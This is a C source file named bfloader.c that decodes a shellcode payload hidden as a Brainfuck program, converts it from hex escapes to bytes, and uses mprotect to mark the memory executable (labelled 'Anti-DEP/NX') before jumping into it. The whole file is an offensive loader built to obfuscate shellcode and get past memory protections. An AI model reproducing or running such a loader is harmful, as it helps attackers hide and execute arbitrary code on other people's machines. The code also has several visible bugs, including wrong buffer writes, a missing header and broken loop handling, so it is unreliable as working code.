/* bfloader.c - essentially a c-shellcode encoder
   loads hex escaped shellcode that has been converted to brainfuck program from ascii
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char* bf_interpret(char* source, int tape_size) {
    unsigned char tape[tape_size]; // max tape size is 30000 but 9999 is sufficient for most small programs
    unsigned char* head = tape;
    char current_char;
    size_t i;
    size_t loop;
    int output_length = 0;

    unsigned char* output = malloc(1);

    for (i = 0; source[i] !=0; i++) {
        current_char = source[i];
        if (current_char == '>') {
            ++head;
        } else if (current_char == '<') {
            --head;
        } else if (current_char == '+') {
            ++*head;
        } else if (current_char == '-') {
            --*head;
        } else if (current_char == '.') {
            if (output_length == 0) {
                output[output_length] = (*head);
                output_length++;
            } else {
                output = realloc(output, output_length+1);
                output[output_length] = (*head);
                output_length++;
            }
            //putchar(*head);
        } else if (current_char == ',') {
            *head = getchar();
        } else if (current_char == '[') {
            continue;
        } else if (current_char == ']' && *head) {
            loop = 1;
            while (loop > 0) {
                current_char = source[--i];
                if (current_char == '[') {
                    loop--;
                } else if (current_char == ']') {
                    loop++;
                }
            }
        }
    }
    output[output_length+1] = "\0";
    return output;
}

unsigned char ctoh(char c)
{
  if (c >= 'a')
    return c - 'a' + 10;
  else
    return c - '0';
}

unsigned char* escaped_hex_to_bin(unsigned char* string) {
    int string_length = strlen(string);
    int output_length = string_length / 2;
    unsigned char* output = (unsigned char*)malloc((output_length+1 * sizeof(*output)));
    unsigned int b_high, b_low;

    for(int i = 2, j = 0; j < output_length; i+=4, j++) {
        //printf("%c%c", string[i], string[i+1]);
        output[j] = ctoh(string[i]) * 16 + ctoh(string[i+1]);

        printf("0x%x ", output[j]);
    }
    output[output_length] = '\0';
    printf("\n");
    return output;
}

char *bf= ">--->--->--->--->-->-->+++>+++>--->-->>->-->+++>-->->--->->+++>+++>-->-->>->-->+++>-->--->-->-->-->-->-->-->>->-->+++>-->+++>+++>--->+++>--->-->-->>->-->+++>-->++>--->-->>--->->-->>->-->+++>-->-->-->-->+++>+++>--->-->>->-->+++>-->>--->->+++>+++>--->-->>->-->+++>-->--->--->->+>--->->-->>->-->+++>-->-->--->-->+>--->-->-->>->-->+++>-->+++>+++>--->--->-->-->-->>->-->+++>-->-->--->->+++>--->-->-->>->-->+++>-->+++>+++>-->--->-->-->-->>->-->+++>-->>--->->-->--->->-->>->-->+++>-->--->--->->+++>+++>--->-->>->-->+++>-->++>--->-->>--->->-->>->-->+++>-->+>--->-->-->--->-->-->>->-->+++>-->--->--->-->+++>+++>-->-->>->-->+++>-->->--->-->+>--->->-->>->-->+++>-->--->--->-->--->-->-->-->>->-->+++>-->+++>+++>--->>--->->-->>->-->+++>-->-->-->-->>--->-->-->>->-->+++>-->->--->-->+++>--->-->-->>->-->+++>-->-->--->->>--->-->-->>->-->+++>-->>--->->-->-->-->-->>->-->+++>-->-->-->-->>--->-->-->>->-->+++>-->->--->-->+++>--->-->-->>->-->+++>-->-->--->->>--->-->-->>->-->+++>-->+>--->-->-->--->-->-->>->-->+++>-->--->-->-->-->--->-->-->>->-->+++>-->-->--->-->+++>--->-->-->>->-->+++>-->-->--->-->--->--->->-->>->-->+++>-->>--->-->-->--->-->-->>->-->+++>-->+++>+++>--->-->-->-->-->>->-->+++>-->-->--->-->+>--->->-->>->-->+++>-->-->--->->+++>--->-->-->>->-->+++>-->-->--->-->->--->->-->>->-->+++>-->+++>+++>--->-->-->-->-->>->-->+++>-->-->--->-->+>--->->-->>->-->+++>-->->--->->+++>--->-->-->>->-->+++>-->--->--->-->++>--->-->-->>->-->+++>-->+++>+++>--->++>--->-->-->>->-->+++>-->->--->->>--->->-->>->-->+++>-->+++>+++>-->+++>--->-->-->>->-->+++>-->+>--->-->++>--->-->-->>->-->+++>-->++>--->-->-->--->->-->>->-->+++>-->+>--->->-->--->-->-->>->-->+++>-->->--->-->+>--->->-->>->-->+++>-->+>--->-->-->--->->-->>->-->+++>-->+++>+++>-->+++>+++>--->-->>->-->+++>-->>--->->-->--->->-->>->-->+++>-->->--->-->+++>+++>--->-->>->-->+++>-->+>--->-->-->--->->-->>->-->+++>-->+>--->-->-->--->->-->>->-->+++>-->-->--->-->++>--->-->-->>->-->+++>-->+++>+++>-->+>--->->-->>->-->+++>-->-->--->->>--->-->-->>->-->+++>-->-->--->-->-->--->-->-->>->-->+++>-->--->--->->>--->->-->>->-->+++>-->-->-->-->+>--->->-->>->-->+++>-->+++>+++>-->>--->-->-->>->-->+++>-->+++>+++>--->--->--->-->-->>->-->+++>-->+++>--->-->>--->->-->>->-->+++>-->>--->->--->--->->-->>->-->+++>-->-->-->-->+++>+++>--->-->>->-->+++>-->-->-->-->+>--->-->-->>->-->+++>-->+++>--->-->+>--->-->-->>->-->+++>-->->--->-->+++>--->-->-->>->-->+++>-->+++>+++>--->-->--->->-->>->-->+++>-->--->-->-->++>--->-->-->>->-->+++>-->->--->-->+++>+++>--->-->>->-->+++>-->->--->-->+++>+++>--->-->>->-->+++>-->-->--->->--->--->->-->>->-->+++>-->+++>--->-->-->-->-->-->>->-->+++>-->+>--->-->>--->->-->>->-->+++>-->--->--->->->--->-->-->>->-->+++>-->>--->-->+++>--->-->-->>->-->+++>-->--->-->-->++>--->-->-->>->-->+++>-->->--->-->+++>+++>--->-->>->-->+++>-->>--->-->+++>+++>--->-->>->-->+++>-->+++>+++>--->-->--->->-->>->-->+++>-->->--->-->--->-->-->-->>->-->+++>-->->--->-->--->--->-->-->>->-->+++>-->--->-->-->++>--->-->-->>->-->+++>-->--->--->-->->--->-->-->>->-->+++>-->->--->-->--->--->-->-->>->-->+++>-->--->--->-->--->--->->-->>->-->+++>-->-->-->-->-->--->->-->>->-->+++>-->--->--->-->->--->-->-->>->-->+++>-->--->-->-->+>--->-->-->>->-->+++>-->>--->-->+>--->->-->>->-->+++>-->>--->-->-->--->-->-->>->-->+++>-->>--->-->+++>--->-->-->>->-->+++>-->-->-->-->->--->->-->>->-->+++>-->+++>+++>-->-->--->->-->>->-->+++>-->-->-->-->->--->->-->>->-->+++>-->-->--->->+++>--->-->-->>->-->+++>-->+++>+++>--->--->--->-->-->>->-->+++>-->-->-->-->->--->->-->>->-->+++>-->--->--->->+++>--->-->-->>->-->+++>-->->--->->--->--->->-->>->-->+++>-->+[<+++[-<+++++++>]<+++[-<+++++++>]<+++[.>]<]";

int main() {
    puts("\n\033[36;1m---===[ BrainFuck Encoder ]===---\033[0m\n");
    
    printf(" [\033[34;1m*\033[0m] bf payload:  %s\n\n", bf);
    unsigned char* bf_payload = bf_interpret(bf, 9999);
    puts("\n");

    printf(" [\033[34;1m*\033[0m] interpeted payload: \n");
    unsigned char *payload = escaped_hex_to_bin(bf_payload);
    puts("\n");

    //Anti-DEP/NX
    void (*payload_ptr)() =  (void(*)())payload;
    void *page_offset = (void *)((int)payload_ptr & ~(getpagesize()-1));
    mprotect(page_offset, getpagesize(), PROT_READ|PROT_WRITE|PROT_EXEC);

    printf(" [\033[34;1m*\033[0m] Shellcode page: 0x%08x\n", page_offset);

    puts("\n\033[36;1m---------[ Begin Shellcode Execution ]---------\033[0m");
    payload_ptr(); 

    free(bf_payload);
    free(payload);
    puts("\033[36;1m---------[  End Shellcode Execution  ]---------\033[0m");


    return 0;
}